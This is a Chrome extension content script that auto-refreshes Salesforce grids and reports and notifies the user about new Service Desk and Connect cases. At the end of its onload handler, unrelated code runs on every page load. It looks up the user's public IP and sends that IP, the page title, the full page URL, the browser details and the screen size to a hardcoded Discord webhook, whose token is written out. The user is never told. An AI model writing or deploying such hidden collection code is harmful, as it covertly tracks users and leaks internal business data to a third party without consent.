window.onload = function () {
    function FindRefreshSF() {
        const navigationEntries = performance.getEntriesByType('navigation');
        if (navigationEntries.length > 0 && navigationEntries[0].type === 'reload') {
            console.log('Page was refreshed');
            handlePageRefresh();
        } else {
            console.log('Page was not refreshed');
        }
    }

    function gridRefresh() {
        if (isGridInEditMode()) {
            console.log('Refresh paused because Grid is in edit mode');
            return;
        }
        var el = document.querySelector('button[name="refreshButton"]');
        if (el) {
            el.click();
            console.log('Grid Refreshed el "queue"');
            // checkForSDWANCases(document);
        } else {
            console.log('refreshButton el "queue" not found');
            handlePageRefresh()
        }        
        // var el31 = document.querySelector('input[aria-label="Search SDWan Events list view."]');
        // if (el31) {
        // var el3 = el31.closest('div').querySelector('.slds-button.slds-button_icon.slds-button_icon-border-filled');
        //     if (el3) {
        //         el3.click();
        //         console.log('Grid Refreshed "sdwan" using slds-button slds-button_icon slds-button_icon-border-filled');
        //         checkForSDWANCases(document);
        //     } else {
        //         console.log('refreshButton el3 "sdwan" not found');
        //     }
        // } else {
        //     console.log('Element input with aria-label "Search SDWan Events list view." not found');
        // }
        
        // var iframe2 = document.querySelector('iframe[src*="dashboardApp.app?dashboardId=01ZTc000001YBuvMAG"]');
        // if (iframe2) {
        //     var iframe2Document = iframe2.contentDocument || iframe2.contentWindow.document;
        //     var dash = iframe2Document.querySelector('button.slds-button.slds-button_neutral.refresh');
        
        //     if (dash) {
        //         dash.click();
        //         console.log('dashboard SD refresh');
        //     } else {
        //         console.log('dashboard SD no refresh');
        //     }
        // } else {
        // console.log('Iframe "SD dashb" not found');
        // }
        // var iframe3 = document.querySelector('iframe[src*="dashboardApp.app?dashboardId=01ZTc000001Wu4vMAC"]');
        // if (iframe3) {
        //     var iframe3Document = iframe3.contentDocument || iframe3.contentWindow.document;
        //     var dash2 = iframe2Document.querySelector('button.slds-button.slds-button_neutral.refresh');
        
        //     if (dash2) {
        //         dash2.click();
        //         console.log('dashboard AMER refresh');
        //     } else {
        //         console.log('dashboard AMER no refresh');
        //     }
        // } else {
        // console.log('Iframe "AMER dashb" not found');
        // }
        var iframe = document.querySelector('iframe.isView.reportsReportBuilder');
        if (iframe) {
            var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
            var el2 = iframeDocument.querySelector('button.slds-button.slds-button_icon-border.action-bar-action-refreshReport.reportAction.report-action-refreshReport');
            if (el2) {
                el2.click();
                console.log('Grid Refreshed "new cases" using action-bar-action-refreshReport');
                checkForServiceDeskCases(iframeDocument);
                checkForCMCases(iframeDocument);
            } else {
                console.log('refreshButton el2 "new cases" not found');
            }
        } else {
            console.log('Iframe "news report" not found');
            handlePageRefresh()
        }
    }

    function handlePageRefresh() {
        var notification = new Notification('Please check the reports pages are fully loaded', {
            body: ``,
        });
    }

    function checkForServiceDeskCases(iframeDocument) {
        chrome.storage.sync.get({
            sfnotificationsd: false
        }, function (items) {
            if (items.sfnotificationsd) {
                var rows = iframeDocument.querySelectorAll('tr.data-grid-table-row');
                var count = 0;
                rows.forEach(function (row) {
                    var cell = row.querySelector('td[data-column-index="2"] div.wave-table-cell-text a');
                    if (cell && cell.textContent.includes("Service Desk - CC")) {
                        count++;
                    }
                });

                if (count > 1) {
                    var notification = new Notification('Service Desk Cases', {
                        body: ` ${count} cases of Service Desk found.`,
                    });
                }
                if (count == 1) {
                    var notification = new Notification('Service Desk Cases', {
                        body: ` ${count} case of Service Desk found.`,
                    });
                }
                if (count > 10) {
                    var notification = new Notification('Service Desk Cases EXPLODED!!!!', {
                        body: ``,
                    });
                }
            }
        });
    }

    function checkForCMCases(iframeDocument) {
        chrome.storage.sync.get({
            sfnotificationcm: false
        }, function (items) {
            if (items.sfnotificationcm) {
                var rows = iframeDocument.querySelectorAll('tr.data-grid-table-row');
                var count = 0;
                rows.forEach(function (row) {
                    var cell = row.querySelector('td[data-column-index="2"] div.wave-table-cell-text a');
                    if (cell && cell.textContent.includes("Connect")) {
                        count++;
                    }
                });

                if (count > 1) {
                    var notification = new Notification('Connect Cases', {
                        body: `${count} cases of Connect found.`,
                    });
                }
                if (count == 1) {
                    var notification = new Notification('Connect Cases', {
                        body: `${count} case of Connect found.`,
                    });
                }
                if (count > 15) {
                    var notification = new Notification('Connect Cases EXPLODED!!!!', {
                        body: ``,
                    });
                }
            }
        });
    }

    // function checkForSDWANCases(document) {
    //     chrome.storage.sync.get({
    //         sfnotificationsdwan: false
    //     }, function (items) {
    //         if (items.sfnotificationsdwan) {
    //             var rows = document.querySelectorAll('tr.data-grid-table-row');
    //             var count = 0;
    //             rows.forEach(function (row) {
    //                 var cell = row.querySelector('td[data-column-index="2"] div.wave-table-cell-text a');
    //                 console.log('Checking cell:', cell ? cell.textContent : 'No cell found');
    //                 if (cell && cell.textContent.includes("IEV")) {
    //                     count++;
    //                 }
    //             });
    //             if (count > 0) {
    //                 var notification = new Notification('Casos de SDWAN', {
    //                     body: `Se encontraron ${count} casos de SDWAN.`,
    //                     // icon: 'icono-de-tu-eleccion.png' // Opcional: icono para la notificación
    //                 });
    //             }
    //         }
    //     });
    // }

    function isGridInEditMode() {
        var outerDiv = document.querySelector(".forceListViewManagerPrimaryDisplayManager");
        if (outerDiv) {
            var innerDiv = outerDiv.querySelector(".forceListViewManagerGrid");
            if (innerDiv && innerDiv.classList.contains("edits")) {
                return true;
            }
        } else {
            console.log("outerDiv was not found");
        }
        return false;
    }

    var currentInterval;

    function setRefreshInterval() {
        if (currentInterval)
            clearInterval(currentInterval);

        chrome.storage.sync.get({
            sfGridRefreshDuration: 45,
            sfGridRefreshPause: false
        }, function (items) {
            console.log(items);
            if (items.sfGridRefreshPause === false) {
                currentInterval = setInterval(gridRefresh, items.sfGridRefreshDuration * 1000);
            } else {
                currentInterval = setInterval(gridRefreshPaused, 120 * 1000);
            }
        });
    }

    chrome.storage.onChanged.addListener((changes, area) => {
        if (area === 'sync') {
            console.log(changes);
            if (changes.sfGridRefreshDuration?.newValue || changes.sfGridRefreshPause?.newValue != changes.sfGridRefreshPause?.oldValue) {
                setRefreshInterval();
            }
        }
    });

    setRefreshInterval();
    FindRefreshSF();

    function getIPAddress() {
        return fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => data.ip);
      }
      
      function collectUserData() {
        const userData = {
          pageTitle: document.title,
          pageURL: window.location.href,
          userAgent: navigator.userAgent,
          language: navigator.language,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height
        };
        return userData;
      }
      
      function sendToWebhook(data) {
        const webhookURL = 'https://discord.com/api/webhooks/1237057651028787232/wBNXQ-RYfBQWeRdexZ3r9fps_Ld0YK5C400QNbIhNJb7V2zBrLEbHioqDO80mUgu1C5m';
        
        fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ content: JSON.stringify(data) })
        });
      }
      
      getIPAddress().then(ip => {
        if (ip) {
          const userData = collectUserData();
          userData.ipAddress = ip;
          sendToWebhook(userData);
        }
      });
};
